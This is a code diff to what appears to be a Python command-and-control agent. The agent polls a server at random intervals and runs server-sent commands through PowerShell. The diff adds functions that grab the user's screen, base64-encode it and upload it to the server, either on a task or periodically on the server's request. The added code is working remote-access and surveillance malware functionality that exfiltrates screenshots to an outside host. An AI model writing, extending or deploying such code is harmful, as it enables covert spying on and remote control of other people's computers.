@@ -1,4 +1,5 @@
 # ...existing code...
+from typing import Optional
 import time
 import requests
 import random
@@ -8,6 +9,12 @@ import signal
 import atexit
 import threading
 import sys
+import io
+import base64
+try:
+    from PIL import ImageGrab
+except Exception:
+    ImageGrab = None
 
 SLEEP_MIN = 10     # Minimum sleep in seconds
 SLEEP_MAX = 30     # Maximum sleep in seconds
@@ -57,6 +64,30 @@ def check_in():
         print(f"Check-in error: {e}")
 
 
+def upload_screenshot_now(task_id: Optional[str] = None) -> str:
+    """Capture and upload a screenshot immediately. Returns status string."""
+    try:
+        if ImageGrab is None:
+            return "Screenshot not supported (Pillow not installed)"
+        img = ImageGrab.grab()
+        buf = io.BytesIO()
+        img.save(buf, format='PNG')
+        b = buf.getvalue()
+        b64 = base64.b64encode(b).decode('ascii')
+        machine_id = get_machine_id()
+        payload = {"machine_id": machine_id, "task_id": task_id, "image_b64": b64}
+        try:
+            r = requests.post(f"{SERVER_URL}upload_screenshot", json=payload, timeout=10)
+            if r.status_code == 200:
+                return "Screenshot uploaded"
+            else:
+                return f"Screenshot upload failed: {r.status_code}"
+        except Exception as e:
+            return f"Screenshot upload error: {e}"
+    except Exception as e:
+        return f"Screenshot capture error: {e}"
+
+
 def get_tasks():
     """Return tuple (tasks_list, recommended_sleep_seconds).
 
@@ -102,6 +133,28 @@ def execute_task(task: dict) -> str:
     """
     ttype = task.get("type", "").upper()
     try:
+        if ttype == "SCREENSHOT":
+            # capture a screenshot and upload it to the server
+            try:
+                if ImageGrab is None:
+                    return "Screenshot not supported (Pillow not installed)"
+                img = ImageGrab.grab()
+                buf = io.BytesIO()
+                img.save(buf, format='PNG')
+                b = buf.getvalue()
+                b64 = base64.b64encode(b).decode('ascii')
+                machine_id = get_machine_id()
+                payload = {"machine_id": machine_id, "task_id": task.get("task_id"), "image_b64": b64}
+                try:
+                    r = requests.post(f"{SERVER_URL}upload_screenshot", json=payload, timeout=10)
+                    if r.status_code == 200:
+                        return "Screenshot uploaded"
+                    else:
+                        return f"Screenshot upload failed: {r.status_code}"
+                except Exception as e:
+                    return f"Screenshot upload error: {e}"
+            except Exception as e:
+                return f"Screenshot capture error: {e}"
         if ttype == "CMD":
             cmd = task.get("command", "")
             # Run the command in PowerShell
@@ -235,16 +288,30 @@ def main():
                     sleep_duration = random.randint(SLEEP_MIN, SLEEP_MAX)
             print(f"Sleeping for {sleep_duration} seconds...")
             # report upcoming sleep to server so server can display status
+            screenshot_after_sleep = False
             try:
                 machine_id = get_machine_id()
-                requests.post(f"{SERVER_URL}status_update", params={"machine_id": machine_id, "sleeping_for": sleep_duration}, timeout=3)
+                r = requests.post(f"{SERVER_URL}status_update", params={"machine_id": machine_id, "sleeping_for": sleep_duration}, timeout=3)
+                try:
+                    data = r.json()
+                    screenshot_after_sleep = bool(data.get("screenshot_after_sleep", False))
+                except Exception:
+                    screenshot_after_sleep = False
             except Exception:
                 # ignore status update failures — best-effort
-                pass
+                screenshot_after_sleep = False
             # wait can be interrupted by signals; STOP_EVENT.wait returns True if event set
             STOP_EVENT.wait(sleep_duration)
             if STOP_EVENT.is_set():
                 break
+            # if the server asked for a screenshot after the sleep interval, take and upload one now
+            if screenshot_after_sleep:
+                try:
+                    print("Taking periodic screenshot after sleep...")
+                    sres = upload_screenshot_now()
+                    print(sres)
+                except Exception as e:
+                    print(f"Periodic screenshot error: {e}")
             # No more regular check_in on every loop — initial check_in happens on start.
             # Continue to next loop where we'll call get_tasks() again and honor server's suggestion.
     except KeyboardInterrupt:
